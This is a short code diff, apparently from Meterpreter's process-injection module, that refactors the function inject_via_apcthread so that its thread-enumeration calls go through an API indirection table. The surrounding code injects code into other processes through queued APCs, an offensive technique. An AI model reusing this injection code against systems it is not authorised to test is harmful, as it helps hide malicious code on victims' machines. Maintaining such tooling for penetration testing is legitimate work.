@@ -255,11 +255,11 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 		if( !pNtQueueApcThread )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed" )
 
-		hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
+		hThreadSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
 		if( !hThreadSnap )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )
 
-		if( !Thread32First( hThreadSnap, &t ) )
+		if( !met_api->win_api.kernel32.Thread32First( hThreadSnap, &t ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )
 		
 		// Allocate memory for the apc stub and context
